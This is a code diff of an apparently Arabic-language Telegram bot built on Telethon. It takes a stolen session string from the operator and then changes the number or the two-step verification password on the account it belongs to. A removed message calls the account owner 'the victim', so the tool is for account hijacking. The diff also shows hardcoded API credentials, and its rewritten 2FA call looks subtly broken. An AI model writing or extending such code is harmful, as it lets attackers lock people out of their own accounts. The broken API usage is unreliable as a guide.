@@ -48,27 +48,22 @@ async def change_number(strses, number):
     ))
     return str(result)
 
-# إضافة دالة لتغيير رمز التحقق بخطوتين
-async def change_2fa_password(strses, new_password, hint=""):
+# تعريف وظيفة تغيير التحقق بخطوتين (2FA)
+async def change_2fa(strses, current_password, new_password, hint=""):
     async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+        bot = client = X
         try:
-            # الحصول على معلومات التحقق بخطوتين
-            result = await X(functions.account.GetPasswordRequest())
-            if result.has_password:
-                # تغيير رمز التحقق بخطوتين
-                await X(functions.account.UpdatePasswordSettingsRequest(
-                    password=result.current_password_hash,
-                    new_settings=types.account.PasswordInputSettings(
-                        new_algo=result.current_algo,
-                        new_password_hash=new_password,
-                        hint=hint
-                    )
-                ))
-                return True, "تم تغيير رمز التحقق بخطوتين بنجاح."
-            else:
-                return False, "التحقق بخطوتين غير مفعل."
+            await bot(functions.account.UpdatePasswordSettingsRequest(
+                current_password_hash=current_password,
+                new_settings=types.account.PasswordInputSettings(
+                    new_salt=new_password,
+                    hint=hint,
+                    email=""
+                )
+            ))
+            return True
         except Exception as e:
-            return False, f"حدث خطأ: {str(e)}"
+            return str(e)
           
 async def userinfo(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
@@ -526,29 +521,23 @@ async def users(event):
       except Exception as e:
         await event.respond(f"قم بتوجيه الرسالة في مجموعة المساعدة الخاصة بالقسم المدفوع \n str(e)")
 
-# إضافة حدث لمعالجة الضغط على الزر "O"
+# معالج حدث الزر "O" (تغيير التحقق بخطوتين)
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"N")))
-async def users(event):
+async def change_2fa_handler(event):
     async with bot.conversation(event.chat_id) as x:
         await x.send_message("الان ارسل الكود تيرمكس")
         strses = await x.get_response()
-        op = await cu(strses.text)
-        if op:
-            pass
+        await x.send_message("ارسل كلمة المرور الحالية")
+        current_password = (await x.get_response()).text
+        await x.send_message("ارسل كلمة المرور الجديدة")
+        new_password = (await x.get_response()).text
+        await x.send_message("ارسل تلميح كلمة المرور (اختياري)")
+        hint = (await x.get_response()).text
+        result = await change_2fa(strses.text, current_password, new_password, hint)
+        if result == True:
+            await event.reply("تم تغيير التحقق بخطوتين بنجاح ✅", buttons=keyboard)
         else:
-            return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
-        
-        # طلب إدخال الرمز الجديد للتحقق بخطوتين
-        await x.send_message("الرجاء إدخال الرمز الجديد للتحقق بخطوتين:")
-        new_password = await x.get_response()
-        
-        # طلب إدخال تلميح (اختياري)
-        await x.send_message("الرجاء إدخال تلميح للرمز الجديد (اختياري):")
-        hint = await x.get_response()
-        
-        # استدعاء دالة تغيير رمز التحقق بخطوتين
-        success, message = await change_2fa_password(strses.text, new_password.text, hint.text)
-        await event.reply(message, buttons=keyboard
+            await event.reply(f"حدث خطأ: {result}", buttons=keyboard)
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"O")))
 async def start(event):
